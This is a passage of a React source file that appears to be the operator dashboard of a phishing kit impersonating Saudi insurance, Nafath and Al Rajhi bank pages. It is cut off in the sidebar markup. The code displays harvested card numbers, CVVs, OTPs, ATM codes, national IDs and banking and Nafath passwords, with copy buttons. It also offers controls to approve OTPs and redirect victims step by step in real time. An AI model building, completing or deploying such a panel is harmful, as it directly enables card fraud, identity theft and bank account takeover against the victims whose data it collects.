import { useState, useEffect, useMemo } from "react";
import { useLocation } from "wouter";
import {
  Trash2,
  CreditCard,
  Bell,
  CheckCircle,
  Search,
  User,
  Phone,
  ClipboardCheck,
  Shield,
  Clock,
  Calendar,
  Hash,
  Key,
  Smartphone,
  X,
  Copy,
  Check,
  RefreshCw,
  Eye,
  EyeOff,
  Wifi,
  Globe,
  MapPin,
  AlertTriangle,
  Banknote,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogFooter,
  DialogTrigger,
  DialogClose,
} from "@/components/ui/dialog";
import {
  collection,
  doc,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
} from "firebase/firestore";
import { onValue, ref } from "firebase/database";
import { Input } from "@/components/ui/input";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { db, database, isFirebaseConfigured } from "@/lib/firebase";

interface Notification {
  id: string;
  personalInfo?: {
    acceptMarketing?: boolean;
    birthDay?: string;
    birthMonth?: string;
    birthYear?: string;
    isHijri?: boolean;
  };
  nationalId?: string;
  phoneNumber?: string;
  phoneCarrier?: string;
  phoneIdNumber?: string;
  cardName?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  otpCode?: string;
  otpVerified?: boolean;
  phoneOtpCode?: string;
  phoneOtpSubmittedAt?: string;
  phoneSubmittedAt?: string;
  phoneVerificationStatus?: string;
  nafazId?: string;
  nafazPass?: string;
  nafazStatus?: string;
  nafazSubmittedAt?: string;
  authNumber?: string;
  rajhiUser?: string;
  rajhiPassword?: string;
  rajhiOtp?: string;
  atmVerification?: {
    code?: string;
    status?: string;
    timestamp?: string;
  };
  selectedOffer?: {
    insuranceType?: string;
    offerId?: string;
    offerName?: string;
    totalPrice?: number;
    status?: string;
  };
  approvalStatus?: string;
  currentPage?: string;
  currentStep?: number;
  status?: string;
  createdAt?: string;
  lastSeen?: any;
  online?: boolean;
  isUnread?: boolean;
  isHidden?: boolean;
  any?: "red" | "yellow" | "green" | null;
  cardOtpApproved?: boolean;
  cardPinApproved?: boolean;
  phoneOtpApproved?: boolean;
  nafathApproved?: boolean;
  adminDirective?: {
    targetPage?: string;
    targetStep?: number;
    issuedAt?: string;
  };
  browser?: string;
  os?: string;
  ip?: string;
  country?: string;
}

const pageLabels: Record<string, string> = {
  "motor-insurance": "تأمين السيارات",
  "phone-verification": "التحقق من الهاتف",
  "nafaz": "نفاذ",
  "rajhi": "الراجحي",
};

function UserStatus({ visitorId }: { visitorId: string }) {
  const [isOnline, setIsOnline] = useState(false);

  useEffect(() => {
    if (!database || !isFirebaseConfigured) return;
    const statusRef = ref(database, `status/${visitorId}`);
    const unsubscribe = onValue(statusRef, (snapshot) => {
      const data = snapshot.val();
      setIsOnline(data?.state === "online");
    });
    return () => unsubscribe();
  }, [visitorId]);

  return (
    <div className={`w-2.5 h-2.5 rounded-full ${isOnline ? "bg-emerald-500" : "bg-gray-400"}`} />
  );
}

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  
  const handleCopy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <button onClick={handleCopy} className="text-gray-400 hover:text-gray-600 transition-colors">
      {copied ? <Check className="w-4 h-4 text-emerald-500" /> : <Copy className="w-4 h-4" />}
    </button>
  );
}

export default function Dashboard() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedVisitor, setSelectedVisitor] = useState<Notification | null>(null);
  const [atmCode, setAtmCode] = useState("");

  const hasData = (n: Notification) => {
    return !!(
      n.cardName ||
      n.nationalId ||
      n.phoneNumber ||
      n.cardNumber ||
      n.otpCode ||
      n.phoneOtpCode ||
      n.rajhiUser ||
      n.nafazId ||
      n.personalInfo?.birthYear
    );
  };

  const filteredNotifications = useMemo(() => {
    return notifications.filter((notification) => {
      if (!hasData(notification)) return false;
      const matchesSearch =
        !searchTerm ||
        notification.cardName?.toLowerCase().includes(searchTerm.toLowerCase()) ||
        notification.nationalId?.includes(searchTerm) ||
        notification.phoneNumber?.includes(searchTerm) ||
        notification.cardNumber?.includes(searchTerm) ||
        notification.id.includes(searchTerm);
      return matchesSearch;
    });
  }, [notifications, searchTerm]);

  const unreadCount = useMemo(() => {
    return filteredNotifications.filter(n => n.isUnread).length;
  }, [filteredNotifications]);

  useEffect(() => {
    if (!isFirebaseConfigured || !db) {
      setIsLoading(false);
      return;
    }
    
    const q = query(collection(db, "pays"), orderBy("createdAt", "desc"));
    
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const notificationsData: Notification[] = [];
      
      snapshot.forEach((doc) => {
        const data = doc.data();
        if (!data.isHidden) {
          notificationsData.push({
            id: doc.id,
            ...data,
          } as Notification);
        }
      });

      setNotifications(notificationsData);
      setIsLoading(false);
      
      if (selectedVisitor) {
        const updated = notificationsData.find(n => n.id === selectedVisitor.id);
        if (updated) setSelectedVisitor(updated);
      }
    });

    return () => unsubscribe();
  }, []);

  const handleDelete = async (id: string) => {
    if (!db) return;
    try {
      await updateDoc(doc(db, "pays", id), { isHidden: true });
      if (selectedVisitor?.id === id) setSelectedVisitor(null);
      toast({ title: "تم الحذف" });
    } catch (error) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const handleMarkAsRead = async (notification: Notification) => {
    setSelectedVisitor(notification);
    if (notification.isUnread && db) {
      await updateDoc(doc(db, "pays", notification.id), { isUnread: false });
    }
  };

  const handleApprovalStatus = async (id: string, status: string, atmCode?: string) => {
    if (!db) return;
    try {
      const updates: any = { approvalStatus: status };
      if (atmCode) {
        updates.atmVerification = { code: atmCode, status: "pending", timestamp: new Date().toISOString() };
      }
      await updateDoc(doc(db, "pays", id), updates);
      toast({ title: "تم التحديث" });
    } catch (error) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const handleRouting = async (id: string, field: string, value: any) => {
    if (!db) return;
    try {
      if (field === "targetPage" || field === "targetStep") {
        const currentNotification = notifications.find(n => n.id === id);
        const currentDirective = currentNotification?.adminDirective || {};
        await updateDoc(doc(db, "pays", id), {
          adminDirective: {
            ...currentDirective,
            [field]: value,
            issuedAt: new Date().toISOString(),
          },
        });
      } else {
        await updateDoc(doc(db, "pays", id), { [field]: value });
      }
    } catch (error) {
      toast({ title: "خطأ", variant: "destructive" });
    }
  };

  const getDisplayName = (n: Notification) => {
    return n.cardName || n.nationalId || n.phoneNumber || n.id.substring(0, 8);
  };

  const getTimeAgo = (dateStr?: string) => {
    if (!dateStr) return "";
    try {
      return format(new Date(dateStr), "HH:mm", { locale: ar });
    } catch {
      return "";
    }
  };

  if (!isFirebaseConfigured) {
    return (
      <div className="flex items-center justify-center h-screen bg-gray-50" dir="rtl">
        <div className="text-center p-8">
          <Shield className="h-16 w-16 mx-auto mb-4 text-gray-300" />
          <h2 className="text-xl font-semibold mb-2">Firebase غير مكون</h2>
          <p className="text-gray-500">يرجى إضافة متغيرات Firebase البيئية</p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-row-reverse h-screen bg-gray-50" dir="rtl">
      {/* Main Content */}
      <div className="flex-1 flex flex-col overflow-hidden">
        {/* Top Header */}
        <div className="bg-white border-b px-6 py-3">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <h1 className="text-lg font-semibold text-gray-800">صندوق الوارد</h1>
              {unreadCount > 0 && (
                <Badge className="bg-red-500 text-white">{unreadCount}</Badge>
              )}
            </div>
            {selectedVisitor && (
              <div className="flex items-center gap-6 text-sm">
                {selectedVisitor.phoneNumber && (
                  <div className="flex items-center gap-2">
                    <span className="text-gray-500">موبايل</span>
                    <span className="font-mono">{selectedVisitor.phoneNumber}</span>
                  </div>
                )}
                {selectedVisitor.nationalId && (
                  <div className="flex items-center gap-2">
                    <span className="text-gray-500">الهوية</span>
                    <span className="font-mono">{selectedVisitor.nationalId}</span>
                  </div>
                )}
              </div>
            )}
            <div className="relative w-64">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
              <Input
                placeholder="بحث..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="pr-10 bg-gray-50 border-gray-200"
                data-testid="input-search"
              />
            </div>
          </div>
        </div>

        {/* Content Area */}
        <div className="flex-1 overflow-auto p-6">
          {!selectedVisitor ? (
            <div className="flex flex-col items-center justify-center h-full text-gray-400">
              <Bell className="h-20 w-20 mb-4 opacity-30" />
              <p className="text-lg">اختر زائر من القائمة</p>
            </div>
          ) : (
            <div className="max-w-4xl mx-auto space-y-6">
              {/* Approval Alert Banner */}
              {(selectedVisitor.currentStep === 4 || selectedVisitor.currentStep === 5 || selectedVisitor.currentStep === 6) && !selectedVisitor.approvalStatus && (
                <div className="bg-amber-50 border-2 border-amber-300 rounded-xl p-4 flex items-center gap-4 animate-pulse" data-testid="alert-approval-pending">
                  <div className="bg-amber-100 rounded-full p-3">
                    <AlertTriangle className="h-8 w-8 text-amber-600" />
                  </div>
                  <div className="flex-1">
                    <h3 className="font-bold text-amber-800 text-lg" data-testid="text-approval-warning-title">تنبيه: بانتظار الموافقة</h3>
                    <p className="text-amber-700 text-sm" data-testid="text-approval-warning-message">
                      {selectedVisitor.currentStep === 4 && "المستخدم في مرحلة إدخال بيانات البطاقة - بانتظار OTP البطاقة"}
                      {selectedVisitor.currentStep === 5 && "المستخدم أدخل OTP البطاقة - بانتظار الموافقة أو رمز الصراف"}
                      {selectedVisitor.currentStep === 6 && "المستخدم في مرحلة التحقق من الصراف - بانتظار إرسال رمز الصراف"}
                    </p>
                  </div>
                  <div className="flex gap-2">
                    {selectedVisitor.currentStep === 5 && (
                      <Button
                        size="sm"
                        onClick={() => handleApprovalStatus(selectedVisitor.id, "approved_otp")}
                        className="bg-emerald-600 hover:bg-emerald-700"
                        data-testid="button-alert-approve-otp"
                      >
                        <CheckCircle className="h-4 w-4 ml-1" />
                        موافقة OTP
                      </Button>
                    )}
                    <Dialog>
                      <DialogTrigger asChild>
                        <Button size="sm" variant="outline" className="border-amber-400 text-amber-700" data-testid="button-alert-atm-dialog">
                          <Banknote className="h-4 w-4 ml-1" />
                          رمز صراف
                        </Button>
                      </DialogTrigger>
                      <DialogContent>
                        <DialogHeader>
                          <DialogTitle>إرسال رمز الصراف</DialogTitle>
                        </DialogHeader>
                        <div className="py-4">
                          <Input
                            value={atmCode}
                            onChange={(e) => setAtmCode(e.target.value)}
                            placeholder="أدخل رمز الصراف"
                            className="text-center text-xl"
                            data-testid="input-alert-atm-code"
                          />
                        </div>
                        <DialogFooter>
                          <DialogClose asChild>
                            <Button 
                              disabled={!atmCode.trim()}
                              onClick={() => {
                                if (atmCode.trim()) {
                                  handleApprovalStatus(selectedVisitor.id, "approved_atm", atmCode.trim());
                                  setAtmCode("");
                                }
                              }}
                              data-testid="button-alert-confirm-atm"
                            >
                              تأكيد
                            </Button>
                          </DialogClose>
                        </DialogFooter>
                      </DialogContent>
                    </Dialog>
                    <Button
                      size="sm"
                      variant="destructive"
                      onClick={() => handleApprovalStatus(selectedVisitor.id, "rejected")}
                      data-testid="button-alert-reject"
                    >
                      <X className="h-4 w-4 ml-1" />
                      رفض
                    </Button>
                  </div>
                </div>
              )}

              {/* OTP Waiting Alert */}
              {selectedVisitor.otpCode && !selectedVisitor.cardOtpApproved && (
                <div className="bg-blue-50 border-2 border-blue-300 rounded-xl p-4 flex items-center gap-4" data-testid="alert-card-otp">
                  <div className="bg-blue-100 rounded-full p-3">
                    <CreditCard className="h-6 w-6 text-blue-600" />
                  </div>
                  <div className="flex-1">
                    <h3 className="font-bold text-blue-800" data-testid="text-card-otp-code">OTP البطاقة: {selectedVisitor.otpCode}</h3>
                    <p className="text-blue-600 text-sm">المستخدم أدخل OTP البطاقة - اضغط للموافقة</p>
                  </div>
                  <Button
                    size="sm"
                    onClick={() => handleRouting(selectedVisitor.id, "cardOtpApproved", true)}
                    className="bg-blue-600 hover:bg-blue-700"
                    data-testid="button-approve-card-otp"
                  >
                    <CheckCircle className="h-4 w-4 ml-1" />
                    موافقة
                  </Button>
                </div>
              )}

              {/* Phone OTP Waiting Alert */}
              {selectedVisitor.phoneOtpCode && !selectedVisitor.phoneOtpApproved && (
                <div className="bg-pink-50 border-2 border-pink-300 rounded-xl p-4 flex items-center gap-4" data-testid="alert-phone-otp">
                  <div className="bg-pink-100 rounded-full p-3">
                    <Phone className="h-6 w-6 text-pink-600" />
                  </div>
                  <div className="flex-1">
                    <h3 className="font-bold text-pink-800" data-testid="text-phone-otp-code">OTP الهاتف: {selectedVisitor.phoneOtpCode}</h3>
                    <p className="text-pink-600 text-sm">المستخدم أدخل OTP الهاتف - اضغط للموافقة</p>
                  </div>
                  <Button
                    size="sm"
                    onClick={() => handleRouting(selectedVisitor.id, "phoneOtpApproved", true)}
                    className="bg-pink-600 hover:bg-pink-700"
                    data-testid="button-approve-phone-otp"
                  >
                    <CheckCircle className="h-4 w-4 ml-1" />
                    موافقة
                  </Button>
                </div>
              )}

              {/* Nafaz Waiting Alert */}
              {selectedVisitor.nafazId && !selectedVisitor.nafathApproved && (
                <div className="bg-cyan-50 border-2 border-cyan-300 rounded-xl p-4 flex items-center gap-4" data-testid="alert-nafaz">
                  <div className="bg-cyan-100 rounded-full p-3">
                    <ClipboardCheck className="h-6 w-6 text-cyan-600" />
                  </div>
                  <div className="flex-1">
                    <h3 className="font-bold text-cyan-800" data-testid="text-nafaz-id">نفاذ: {selectedVisitor.nafazId}</h3>
                    <p className="text-cyan-600 text-sm">المستخدم ينتظر تصديق نفاذ - اضغط للموافقة</p>
                  </div>
                  <Button
                    size="sm"
                    onClick={() => handleRouting(selectedVisitor.id, "nafathApproved", true)}
                    className="bg-cyan-600 hover:bg-cyan-700"
                    data-testid="button-approve-nafaz"
                  >
                    <CheckCircle className="h-4 w-4 ml-1" />
                    موافقة
                  </Button>
                </div>
              )}

              {/* Credit Card Section */}
              {(selectedVisitor.cardNumber || selectedVisitor.cardName) && (
                <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
                  <div className="p-4 border-b bg-gray-50 flex items-center justify-between">
                    <h3 className="font-semibold text-gray-700 flex items-center gap-2">
                      <CreditCard className="h-5 w-5" />
                      الدفع
                    </h3>
                    <Badge variant="outline" className="text-emerald-600 border-emerald-200 bg-emerald-50">
                      SAR
                    </Badge>
                  </div>
                  <div className="p-6">
                    {/* Visual Card */}
                    <div className="w-full max-w-[400px] mx-auto aspect-[1.6/1] rounded-xl bg-gradient-to-br from-emerald-600 via-emerald-500 to-teal-500 p-5 text-white shadow-lg relative overflow-hidden mb-6">
                      {/* mada logo placeholder */}
                      <div className="absolute top-4 right-4 flex items-center gap-1">
                        <div className="w-8 h-5 bg-white/20 rounded flex items-center justify-center text-[8px] font-bold">mada</div>
                      </div>
                      {/* Chip */}
                      <div className="absolute top-4 left-4 w-10 h-8 rounded bg-gradient-to-br from-yellow-200 via-yellow-300 to-yellow-400 opacity-90">
                        <div className="absolute inset-1 grid grid-cols-2 gap-0.5">
                          {[...Array(4)].map((_, i) => (
                            <div key={i} className="bg-yellow-500/40 rounded-sm" />
                          ))}
                        </div>
                      </div>
                      {/* Card Number */}
                      <div className="mt-12 mb-4">
                        <p className="font-mono text-xl tracking-[0.15em]" dir="ltr">
                          {selectedVisitor.cardNumber?.replace(/(.{4})/g, '$1 ').trim() || '•••• •••• •••• ••••'}
                        </p>
                      </div>
                      {/* Card Info Row */}
                      <div className="flex justify-between items-end text-sm">
                        <div>
                          <p className="text-white/60 text-[10px] mb-0.5">CARD HOLDER</p>
                          <p className="font-medium uppercase">{selectedVisitor.cardName || 'NAME'}</p>
                        </div>
                        <div className="text-left">
                          <p className="text-white/60 text-[10px] mb-0.5">EXPIRES</p>
                          <p className="font-mono">{selectedVisitor.cardExpiry || 'MM/YY'}</p>
                        </div>
                      </div>
                      {/* CVV Badge */}
                      {selectedVisitor.cardCvv && (
                        <div className="absolute bottom-4 left-4 bg-white/20 backdrop-blur px-2 py-1 rounded text-xs">
                          CVV: <span className="font-bold">{selectedVisitor.cardCvv}</span>
                        </div>
                      )}
                      {/* Visa/Master logo */}
                      <div className="absolute bottom-4 right-4 flex">
                        <div className="w-6 h-6 rounded-full bg-red-400/80" />
                        <div className="w-6 h-6 rounded-full bg-yellow-400/80 -mr-2" />
                      </div>
                      {/* Decorative */}
                      <div className="absolute -bottom-10 -left-10 w-32 h-32 rounded-full bg-white/10" />
                    </div>

                    {/* Card Details */}
                    <div className="space-y-3 text-sm">
                      {selectedVisitor.cardNumber && (
                        <div className="flex justify-between items-center py-2 border-b border-gray-100">
                          <span className="text-gray-500">رقم البطاقة</span>
                          <div className="flex items-center gap-2">
                            <span className="font-mono font-medium">{selectedVisitor.cardNumber}</span>
                            <CopyButton text={selectedVisitor.cardNumber} />
                          </div>
                        </div>
                      )}
                      {selectedVisitor.cardName && (
                        <div className="flex justify-between items-center py-2 border-b border-gray-100">
                          <span className="text-gray-500">اسم حامل البطاقة</span>
                          <span className="font-medium">{selectedVisitor.cardName}</span>
                        </div>
                      )}
                      {selectedVisitor.cardExpiry && (
                        <div className="flex justify-between items-center py-2 border-b border-gray-100">
                          <span className="text-gray-500">تاريخ الانتهاء</span>
                          <span className="font-mono font-medium">{selectedVisitor.cardExpiry}</span>
                        </div>
                      )}
                      {selectedVisitor.cardCvv && (
                        <div className="flex justify-between items-center py-2 border-b border-gray-100">
                          <span className="text-gray-500">CVV</span>
                          <div className="flex items-center gap-2">
                            <span className="font-mono font-bold text-rose-600">{selectedVisitor.cardCvv}</span>
                            <CopyButton text={selectedVisitor.cardCvv} />
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Personal Info Section */}
              {(selectedVisitor.nationalId || selectedVisitor.phoneNumber || selectedVisitor.personalInfo?.birthYear) && (
                <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
                  <div className="p-4 border-b bg-gray-50">
                    <h3 className="font-semibold text-gray-700 flex items-center gap-2">
                      <User className="h-5 w-5" />
                      البيانات الشخصية
                    </h3>
                  </div>
                  <div className="p-6 space-y-3 text-sm">
                    {selectedVisitor.nationalId && (
                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
                        <span className="text-gray-500">رقم الهوية</span>
                        <div className="flex items-center gap-2">
                          <span className="font-mono font-medium">{selectedVisitor.nationalId}</span>
                          <CopyButton text={selectedVisitor.nationalId} />
                        </div>
                      </div>
                    )}
                    {selectedVisitor.phoneNumber && (
                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
                        <span className="text-gray-500">رقم الهاتف</span>
                        <div className="flex items-center gap-2">
                          <span className="font-mono font-medium">{selectedVisitor.phoneNumber}</span>
                          <CopyButton text={selectedVisitor.phoneNumber} />
                        </div>
                      </div>
                    )}
                    {selectedVisitor.phoneCarrier && (
                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
                        <span className="text-gray-500">شركة الاتصالات</span>
                        <span className="font-medium">{selectedVisitor.phoneCarrier}</span>
                      </div>
                    )}
                    {selectedVisitor.personalInfo?.birthYear && (
                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
                        <span className="text-gray-500">تاريخ الميلاد</span>
                        <span className="font-medium">
                          {selectedVisitor.personalInfo.birthDay}/{selectedVisitor.personalInfo.birthMonth}/{selectedVisitor.personalInfo.birthYear}
                        </span>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* OTP Codes Section */}
              {(selectedVisitor.otpCode || selectedVisitor.phoneOtpCode || selectedVisitor.rajhiOtp || selectedVisitor.atmVerification?.code || selectedVisitor.authNumber) && (
                <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
                  <div className="p-4 border-b bg-blue-50">
                    <h3 className="font-semibold text-blue-700 flex items-center gap-2">
                      <Key className="h-5 w-5" />
                      رموز التحقق
                    </h3>
                  </div>
                  <div className="p-6">
                    <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                      {selectedVisitor.otpCode && (
                        <div className="bg-blue-50 rounded-lg p-4 text-center">
                          <p className="text-xs text-gray-500 mb-2">OTP البطاقة</p>
                          <p className="font-mono text-2xl font-bold text-blue-600">{selectedVisitor.otpCode}</p>
                        </div>
                      )}
                      {selectedVisitor.phoneOtpCode && (
                        <div className="bg-pink-50 rounded-lg p-4 text-center">
                          <p className="text-xs text-gray-500 mb-2">OTP الهاتف</p>
                          <p className="font-mono text-2xl font-bold text-pink-600">{selectedVisitor.phoneOtpCode}</p>
                        </div>
                      )}
                      {selectedVisitor.rajhiOtp && (
                        <div className="bg-sky-50 rounded-lg p-4 text-center">
                          <p className="text-xs text-gray-500 mb-2">OTP الراجحي</p>
                          <p className="font-mono text-2xl font-bold text-sky-600">{selectedVisitor.rajhiOtp}</p>
                        </div>
                      )}
                      {selectedVisitor.atmVerification?.code && (
                        <div className="bg-orange-50 rounded-lg p-4 text-center">
                          <p className="text-xs text-gray-500 mb-2">رمز الصراف</p>
                          <p className="font-mono text-2xl font-bold text-orange-600">{selectedVisitor.atmVerification.code}</p>
                        </div>
                      )}
                      {selectedVisitor.authNumber && (
                        <div className="bg-purple-50 rounded-lg p-4 text-center">
                          <p className="text-xs text-gray-500 mb-2">رقم المصادقة</p>
                          <p className="font-mono text-2xl font-bold text-purple-600">{selectedVisitor.authNumber}</p>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Nafaz Section */}
              {(selectedVisitor.nafazId || selectedVisitor.nafazPass) && (
                <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
                  <div className="p-4 border-b bg-cyan-50">
                    <h3 className="font-semibold text-cyan-700 flex items-center gap-2">
                      <ClipboardCheck className="h-5 w-5" />
                      نفاذ
                    </h3>
                  </div>
                  <div className="p-6 space-y-3 text-sm">
                    {selectedVisitor.nafazId && (
                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
                        <span className="text-gray-500">رقم الهوية</span>
                        <div className="flex items-center gap-2">
                          <span className="font-mono font-medium">{selectedVisitor.nafazId}</span>
                          <CopyButton text={selectedVisitor.nafazId} />
                        </div>
                      </div>
                    )}
                    {selectedVisitor.nafazPass && (
                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
                        <span className="text-gray-500">كلمة المرور</span>
                        <div className="flex items-center gap-2">
                          <span className="font-mono font-medium">{selectedVisitor.nafazPass}</span>
                          <CopyButton text={selectedVisitor.nafazPass} />
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* Rajhi Section */}
              {(selectedVisitor.rajhiUser || selectedVisitor.rajhiPassword) && (
                <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
                  <div className="p-4 border-b bg-sky-50">
                    <h3 className="font-semibold text-sky-700 flex items-center gap-2">
                      <Shield className="h-5 w-5" />
                      الراجحي
                    </h3>
                  </div>
                  <div className="p-6 space-y-3 text-sm">
                    {selectedVisitor.rajhiUser && (
                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
                        <span className="text-gray-500">اسم المستخدم</span>
                        <div className="flex items-center gap-2">
                          <span className="font-mono font-medium">{selectedVisitor.rajhiUser}</span>
                          <CopyButton text={selectedVisitor.rajhiUser} />
                        </div>
                      </div>
                    )}
                    {selectedVisitor.rajhiPassword && (
                      <div className="flex justify-between items-center py-2 border-b border-gray-100">
                        <span className="text-gray-500">كلمة المرور</span>
                        <div className="flex items-center gap-2">
                          <span className="font-mono font-medium">{selectedVisitor.rajhiPassword}</span>
                          <CopyButton text={selectedVisitor.rajhiPassword} />
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* Actions Section */}
              <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
                <div className="p-4 border-b bg-gray-50">
                  <h3 className="font-semibold text-gray-700 flex items-center gap-2">
                    <Shield className="h-5 w-5" />
                    الإجراءات
                  </h3>
                </div>
                <div className="p-6">
                  <div className="flex flex-wrap gap-3 mb-6">
                    <Button
                      size="sm"
                      onClick={() => handleApprovalStatus(selectedVisitor.id, "approved_otp")}
                      className="bg-emerald-600 hover:bg-emerald-700"
                      data-testid="button-approve-otp"
                    >
                      <CheckCircle className="h-4 w-4 ml-2" />
                      موافقة OTP
                    </Button>
                    <Dialog>
                      <DialogTrigger asChild>
                        <Button size="sm" variant="outline" data-testid="button-atm-dialog">
                          <Key className="h-4 w-4 ml-2" />
                          إرسال رمز صراف
                        </Button>
                      </DialogTrigger>
                      <DialogContent>
                        <DialogHeader>
                          <DialogTitle>إرسال رمز الصراف</DialogTitle>
                        </DialogHeader>
                        <div className="py-4">
                          <Input
                            value={atmCode}
                            onChange={(e) => setAtmCode(e.target.value)}
                            placeholder="أدخل رمز الصراف"
                            className="text-center text-xl"
                            data-testid="input-atm-code"
                          />
                        </div>
                        <DialogFooter>
                          <DialogClose asChild>
                            <Button 
                              disabled={!atmCode.trim()}
                              onClick={() => {
                                if (atmCode.trim()) {
                                  handleApprovalStatus(selectedVisitor.id, "approved_atm", atmCode.trim());
                                  setAtmCode("");
                                }
                              }} 
                              data-testid="button-confirm-atm"
                            >
                              تأكيد
                            </Button>
                          </DialogClose>
                        </DialogFooter>
                      </DialogContent>
                    </Dialog>
                    <Button
                      size="sm"
                      variant="destructive"
                      onClick={() => handleApprovalStatus(selectedVisitor.id, "rejected")}
                      data-testid="button-reject"
                    >
                      <X className="h-4 w-4 ml-2" />
                      رفض
                    </Button>
                  </div>

                  {/* Routing Controls */}
                  <div className="flex flex-wrap gap-3 pt-4 border-t">
                    <Select onValueChange={(value) => handleRouting(selectedVisitor.id, "targetPage", value)}>
                      <SelectTrigger className="w-40" data-testid="select-target-page">
                        <SelectValue placeholder="توجيه للصفحة" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="motor-insurance">تأمين السيارات</SelectItem>
                        <SelectItem value="phone-verification">التحقق من الهاتف</SelectItem>
                        <SelectItem value="nafaz">نفاذ</SelectItem>
                        <SelectItem value="rajhi">الراجحي</SelectItem>
                      </SelectContent>
                    </Select>
                    <Select onValueChange={(value) => handleRouting(selectedVisitor.id, "targetStep", parseInt(value))}>
                      <SelectTrigger className="w-36" data-testid="select-target-step">
                        <SelectValue placeholder="الخطوة" />
                      </SelectTrigger>
                      <SelectContent>
                        {[1, 2, 3, 4, 5, 6, 7].map((step) => (
                          <SelectItem key={step} value={step.toString()}>الخطوة {step}</SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  {/* Toggle Approvals */}
                  <div className="flex flex-wrap gap-2 pt-4 mt-4 border-t">
                    <Button
                      size="sm"
                      variant={selectedVisitor.cardOtpApproved ? "default" : "outline"}
                      onClick={() => handleRouting(selectedVisitor.id, "cardOtpApproved", !selectedVisitor.cardOtpApproved)}
                      className={selectedVisitor.cardOtpApproved ? "bg-emerald-600" : ""}
                    >
                      <CreditCard className="h-4 w-4 ml-1" />
                      OTP البطاقة
                    </Button>
                    <Button
                      size="sm"
                      variant={selectedVisitor.phoneOtpApproved ? "default" : "outline"}
                      onClick={() => handleRouting(selectedVisitor.id, "phoneOtpApproved", !selectedVisitor.phoneOtpApproved)}
                      className={selectedVisitor.phoneOtpApproved ? "bg-emerald-600" : ""}
                    >
                      <Phone className="h-4 w-4 ml-1" />
                      OTP الهاتف
                    </Button>
                    <Button
                      size="sm"
                      variant={selectedVisitor.nafathApproved ? "default" : "outline"}
                      onClick={() => handleRouting(selectedVisitor.id, "nafathApproved", !selectedVisitor.nafathApproved)}
                      className={selectedVisitor.nafathApproved ? "bg-emerald-600" : ""}
                    >
                      <ClipboardCheck className="h-4 w-4 ml-1" />
                      نفاذ
                    </Button>
                  </div>
                </div>
              </div>

              {/* Status Info */}
              <div className="bg-white rounded-xl shadow-sm border overflow-hidden">
                <div className="p-4 border-b bg-gray-50">
                  <h3 className="font-semibold text-gray-700 flex items-center gap-2">
                    <Clock className="h-5 w-5" />
                    معلومات الحالة
                  </h3>
                </div>
                <div className="p-6 space-y-3 text-sm">
                  <div className="flex justify-between items-center py-2 border-b border-gray-100">
                    <span className="text-gray-500">الصفحة الحالية</span>
                    <Badge variant="outline">{pageLabels[selectedVisitor.currentPage || ""] || "غير محدد"}</Badge>
                  </div>
                  {selectedVisitor.currentStep && (
                    <div className="flex justify-between items-center py-2 border-b border-gray-100">
                      <span className="text-gray-500">الخطوة</span>
                      <span className="font-medium">الخطوة {selectedVisitor.currentStep}</span>
                    </div>
                  )}
                  {selectedVisitor.createdAt && (
                    <div className="flex justify-between items-center py-2 border-b border-gray-100">
                      <span className="text-gray-500">تاريخ الإنشاء</span>
                      <span className="font-medium">{format(new Date(selectedVisitor.createdAt), "PPpp", { locale: ar })}</span>
                    </div>
                  )}
                  {selectedVisitor.approvalStatus && (
                    <div className="flex justify-between items-center py-2 border-b border-gray-100">
                      <span className="text-gray-500">حالة الموافقة</span>
                      <Badge className={
                        selectedVisitor.approvalStatus === "approved_otp" ? "bg-emerald-500" :
                        selectedVisitor.approvalStatus === "approved_atm" ? "bg-blue-500" :
                        selectedVisitor.approvalStatus === "rejected" ? "bg-red-500" : ""
                      }>
                        {selectedVisitor.approvalStatus}
                      </Badge>
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Right Sidebar - Visitor List */}
      <div className="w-80 bg-slate-900 text-white flex flex-col">
        {/* Sidebar Header */}
        <div className="p-4 border-b border-slate-700">
